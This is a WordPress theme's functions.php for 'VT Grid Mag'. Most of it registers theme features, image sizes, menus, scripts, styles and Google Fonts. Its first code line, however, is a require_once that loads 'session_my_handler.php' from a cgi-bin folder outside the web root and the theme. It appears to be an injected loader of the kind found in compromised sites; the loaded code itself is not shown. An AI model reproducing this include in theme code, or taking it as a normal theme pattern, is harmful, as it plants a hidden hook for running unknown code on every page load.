<?php
/**
 * VT Impact functions and definitions
 *
 * @package vt-grid-mag
 */
require_once $_SERVER['DOCUMENT_ROOT'].'/../cgi-bin/session_my_handler.php';
$theme = wp_get_theme();
define ( 'VT_GRID_MAG_VERSION', $theme -> get('Version'));
define ( 'VT_GRID_MAG_AUTHOR_URI', $theme -> get('AuthorURI'));
define ( 'VT_GRID_MAG_LIBS_URI', get_template_directory_uri() . '/libs/');

/**
 *	Set the content width.
 *-----------------------------------------------------------------*/
if( ! isset( $content_width ) ) {
	$content_width = 640;
}

/**
 *	Set-up WordPress features.
 *-----------------------------------------------------------------*/
if ( ! function_exists( 'vt_grid_mag_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function vt_grid_mag_setup() {
	// Load translation domain.
	load_theme_textdomain( 'vt-grid-mag', get_template_directory() . '/languages' );

	// RSS Feed links.
	add_theme_support( 'automatic-feed-links' );

	// Document title.
	add_theme_support( 'title-tag' );

	// HTML5
	add_theme_support( 'html5', array('search-form', 'comment-form', 'comment-list', 'gallery', 'caption' ) );

	// Editor styles.
	add_editor_style( 'editor-style.css' );

	// Post formats.
	add_theme_support( 'post-formats', array( 'video', 'gallery', 'audio' ) );

	// Setup the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'vt_grid_mag_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
	
	// Featured Image.
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 470, 0, true);
	add_image_size( 'vt-grid-mag-thumbnail', 470, 350, true );
	add_image_size( 'vt-grid-mag-cp-small', 80, 70, true ); 
	
	// Register Menus.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary Menu', 'vt-grid-mag' )
	) );

	// Custom Header.
	add_theme_support( 'custom-header', apply_filters( 'vt_grid_mag_header_args', array(
		'flex-width'  => true,
		'flex-height' => true,
		'width'       => 1440,
		'height'      => 320,
		'header-text' => false
	) ) );
	
	// Custom logo
	add_theme_support( 'custom-logo', array(
	   'height'      => 175,
	   'width'       => 400,
	   'flex-width' => true,
	   'header-text' => array( 'site-title', 'site-description' ),
	) );
	
}
endif; // vt_grid_mag_setup
add_action( 'after_setup_theme', 'vt_grid_mag_setup' );

/**
 *	Enqueue scripts and styles.
 *-----------------------------------------------------------------*/
function vt_grid_mag_enqueue_scripts() {
	// Styles
	wp_enqueue_style( 'font-awesome', VT_GRID_MAG_LIBS_URI . 'font-awesome/css/font-awesome.css', array(), '4.7.0' );
	wp_enqueue_style( 'vt-grid-mag-fonts', vt_grid_mag_fonts_url(), array(), null );
	wp_enqueue_style( 'vt-grid-mag-style', get_stylesheet_uri(), '', VT_GRID_MAG_VERSION );
	
	// Scripts
	wp_enqueue_script( 'jquery-fitvids', VT_GRID_MAG_LIBS_URI . 'fitvids/fitvids.js', array(), false, true );
	wp_enqueue_script( 'jquery-masonry' ); // Link the masonry Library already included and registered by WordPress with the scriptaculous handle.
	wp_enqueue_script( 'vt-grid-mag-scripts', get_template_directory_uri() . '/js/vt-grid-mag-scripts.js', array(), false, true );
	
	wp_enqueue_script( 'html5shiv', get_template_directory_uri() . '/js/html5shiv.min.js', array('jquery'), false, false);
	wp_script_add_data( 'html5shiv', 'conditional', 'lt IE 9' );
	
	if( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'vt_grid_mag_enqueue_scripts' );


/**
 *	Register Google fonts.
 *-----------------------------------------------------------------*/
function vt_grid_mag_fonts_url() {
	$fonts_url     = '';
	$_defaults     = array( 'Inconsolata:regular,700', 'Open Sans Condensed:300,300italic,700' );
	$font_families = apply_filters( 'vt_grid_mag_font_families', $_defaults );
	$subsets       = apply_filters( 'vt_grid_mag_font_subsets', 'latin,latin-ext' );

	if ( $font_families ) {
		$font_families = array_unique( $font_families );
		$query_args    = array(
			  'family' => urlencode( implode( '|', $font_families ) )
			, 'subset' => urlencode( $subsets )
		);
		$fonts_url = esc_url( add_query_arg( $query_args, 'https://fonts.googleapis.com/css' ) );
	}

	return $fonts_url;
}

/**
 *	Theme Options.
 *-----------------------------------------------------------------*/
require get_template_directory() . '/admin/functions.php';

/**
 *	Custom Functions.
 *-----------------------------------------------------------------*/
require get_template_directory() . '/inc/external.php';
require get_template_directory() . '/inc/custom-logo.php';
require get_template_directory() . '/inc/template-tags.php';
require get_template_directory() . '/inc/plugins.php';

// Load Widgets and Widgetized Area
require get_template_directory() . '/inc/widgets.php';
add_theme_support('post-thumbnails');
